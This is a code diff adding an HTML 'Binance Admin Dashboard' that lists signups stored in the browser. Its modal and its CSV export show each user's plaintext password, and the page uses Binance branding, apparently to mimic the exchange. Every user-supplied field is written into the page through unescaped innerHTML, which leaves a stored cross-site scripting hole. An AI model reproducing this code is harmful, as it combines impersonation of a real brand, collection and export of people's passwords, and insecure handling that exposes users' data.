@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance - Admin Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
+            color: white;
+            padding: 40px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-left h1 {
+            color: #f3ba2f;
+            font-size: 32px;
+            margin-bottom: 5px;
+        }
+
+        .header-left p {
+            color: #ccc;
+            font-size: 14px;
+        }
+
+        .header-right button {
+            background: #f3ba2f;
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .stat-card h3 {
+            color: #666;
+            font-size: 13px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            letter-spacing: 1px;
+        }
+
+        .stat-card .number {
+            font-size: 40px;
+            font-weight: bold;
+            color: #f3ba2f;
+        }
+
+        .controls {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .controls input {
+            padding: 10px 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            flex: 1;
+            min-width: 250px;
+        }
+
+        .controls button {
+            padding: 10px 20px;
+            background: #f3ba2f;
+            color: #000;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .controls button:hover {
+            background: #e0a91f;
+        }
+
+        .controls button.danger {
+            background: #ff6b6b;
+            color: white;
+        }
+
+        .controls button.danger:hover {
+            background: #ff5252;
+        }
+
+        table {
+            width: 100%;
+            background: white;
+            border-collapse: collapse;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        thead {
+            background: #f3ba2f;
+            color: #000;
+        }
+
+        th {
+            padding: 18px 15px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 14px;
+        }
+
+        tbody tr:hover {
+            background: #fafafa;
+        }
+
+        .email-link {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .email-link:hover {
+            text-decoration: underline;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn-small {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .btn-view {
+            background: #e3f2fd;
+            color: #1976d2;
+        }
+
+        .btn-view:hover {
+            background: #bbdefb;
+        }
+
+        .btn-delete {
+            background: #ffebee;
+            color: #c62828;
+        }
+
+        .btn-delete:hover {
+            background: #c62828;
+            color: white;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+
+        .empty-state h2 {
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #f3ba2f;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .modal-body {
+            color: #666;
+            line-height: 1.8;
+        }
+
+        .modal-body p {
+            margin-bottom: 12px;
+            word-break: break-word;
+        }
+
+        .modal-body strong {
+            color: #333;
+            display: block;
+            margin-top: 15px;
+            margin-bottom: 5px;
+        }
+
+        .modal-footer {
+            text-align: right;
+            margin-top: 25px;
+        }
+
+        .modal-footer button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .modal-footer .close-btn {
+            background: #e0e0e0;
+            color: #333;
+            margin-right: 10px;
+        }
+
+        .modal-footer .delete-btn {
+            background: #ff6b6b;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← Back to Signup Form</a>
+
+        <div class="header">
+            <div class="header-left">
+                <h1>₿ BINANCE ADMIN DASHBOARD</h1>
+                <p>View and manage all user signups</p>
+            </div>
+            <div class="header-right">
+                <button onclick="downloadCSV()">📥 Download CSV</button>
+            </div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Total Signups</h3>
+                <div class="number" id="totalCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Today's Signups</h3>
+                <div class="number" id="todayCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Unique Countries</h3>
+                <div class="number" id="countryCount">0</div>
+            </div>
+        </div>
+
+        <div class="controls">
+            <input type="text" id="searchInput" placeholder="Search by name, email, or username...">
+            <button onclick="searchSignups()">🔍 Search</button>
+            <button onclick="clearSearch()">Clear</button>
+            <button class="danger" onclick="deleteAllData()">🗑️ Delete All</button>
+        </div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Full Name</th>
+                    <th>Email</th>
+                    <th>Username</th>
+                    <th>Country</th>
+                    <th>Phone</th>
+                    <th>Signup Date</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="signupTable">
+                <tr>
+                    <td colspan="8">
+                        <div class="empty-state">
+                            <h2>No signups yet</h2>
+                            <p><a href="index.html">Go to signup page</a> to create an account</p>
+                        </div>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div id="detailsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">User Details</div>
+            <div class="modal-body" id="detailsContent"></div>
+            <div class="modal-footer">
+                <button class="close-btn" onclick="closeModal()">Close</button>
+                <button class="delete-btn" onclick="deleteCurrentUser()">Delete User</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let allSignups = [];
+        let filteredSignups = [];
+        let selectedUserIndex = -1;
+
+        window.addEventListener('load', function() {
+            loadSignups();
+            updateStats();
+        });
+
+        function loadSignups() {
+            allSignups = JSON.parse(localStorage.getItem('signups')) || [];
+            filteredSignups = allSignups;
+            displaySignups(filteredSignups);
+        }
+
+        function displaySignups(signups) {
+            const table = document.getElementById('signupTable');
+
+            if (signups.length === 0) {
+                table.innerHTML = `
+                    <tr>
+                        <td colspan="8">
+                            <div class="empty-state">
+                                <h2>No signups found</h2>
+                                <p><a href="index.html">Go to signup page</a> to create an account</p>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+
+            table.innerHTML = signups.map((signup, index) => `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td><strong>${signup.fullname}</strong></td>
+                    <td><a href="mailto:${signup.email}" class="email-link">${signup.email}</a></td>
+                    <td>${signup.username}</td>
+                    <td>${signup.country}</td>
+                    <td>${signup.phone}</td>
+                    <td>${signup.timestamp}</td>
+                    <td>
+                        <div class="action-buttons">
+                            <button class="btn-small btn-view" onclick="viewDetails(${allSignups.indexOf(signup)})">👁️ View</button>
+                            <button class="btn-small btn-delete" onclick="deleteSignup(${allSignups.indexOf(signup)})">❌ Delete</button>
+                        </div>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function updateStats() {
+            document.getElementById('totalCount').textContent = allSignups.length;
+
+            const today = new Date().toLocaleDateString();
+            const todaySignups = allSignups.filter(s => s.date === today);
+            document.getElementById('todayCount').textContent = todaySignups.length;
+
+            const countries = new Set(allSignups.map(s => s.country));
+            document.getElementById('countryCount').textContent = countries.size;
+        }
+
+        function searchSignups() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            filteredSignups = allSignups.filter(signup =>
+                signup.fullname.toLowerCase().includes(searchTerm) ||
+                signup.email.toLowerCase().includes(searchTerm) ||
+                signup.username.toLowerCase().includes(searchTerm)
+            );
+            displaySignups(filteredSignups);
+        }
+
+        function clearSearch() {
+            document.getElementById('searchInput').value = '';
+            filteredSignups = allSignups;
+            displaySignups(filteredSignups);
+        }
+
+        function viewDetails(index) {
+            selectedUserIndex = index;
+            const signup = allSignups[index];
+            const detailsContent = document.getElementById('detailsContent');
+            detailsContent.innerHTML = `
+                <p><strong>Full Name:</strong> ${signup.fullname}</p>
+                <p><strong>Email:</strong> ${signup.email}</p>
+                <p><strong>Username:</strong> ${signup.username}</p>
+                <p><strong>Password:</strong> ${signup.password}</p>
+                <p><strong>Country:</strong> ${signup.country}</p>
+                <p><strong>Phone:</strong> ${signup.phone}</p>
+                <p><strong>Referral Code:</strong> ${signup.referral}</p>
+                <p><strong>Why Join Binance:</strong> ${signup.message}</p>
+                <p><strong>Signup Date & Time:</strong> ${signup.timestamp}</p>
+            `;
+            document.getElementById('detailsModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('detailsModal').classList.remove('active');
+            selectedUserIndex = -1;
+        }
+
+        function deleteSignup(index) {
+            if (confirm('Are you sure you want to delete this signup?')) {
+                allSignups.splice(index, 1);
+                localStorage.setItem('signups', JSON.stringify(allSignups));
+                loadSignups();
+                updateStats();
+            }
+        }
+
+        function deleteCurrentUser() {
+            if (selectedUserIndex !== -1) {
+                if (confirm('Are you sure you want to delete this user?')) {
+                    allSignups.splice(selectedUserIndex, 1);
+                    localStorage.setItem('signups', JSON.stringify(allSignups));
+                    closeModal();
+                    loadSignups();
+                    updateStats();
+                }
+            }
+        }
+
+        function deleteAllData() {
+            if (confirm('⚠️ WARNING! This will delete ALL signups! Are you absolutely sure?')) {
+                if (confirm('This action CANNOT be undone! Click OK to confirm deletion of all data.')) {
+                    allSignups = [];
+                    localStorage.setItem('signups', JSON.stringify(allSignups));
+                    loadSignups();
+                    updateStats();
+                    alert('✅ All data has been permanently deleted.');
+                }
+            }
+        }
+
+        function downloadCSV() {
+            if (allSignups.length === 0) {
+                alert('No data to download');
+                return;
+            }
+
+            let csv = 'Full Name,Email,Username,Password,Country,Phone,Referral Code,Why Join,Signup Date\n';
+            allSignups.forEach(signup => {
+                csv += `"${signup.fullname}","${signup.email}","${signup.username}","${signup.password}","${signup.country}","${signup.phone}","${signup.referral}","${signup.message}","${signup.timestamp}"\n`;
+            });
+
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `binance-signups-${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+        }
+
+        document.getElementById('detailsModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+</html>
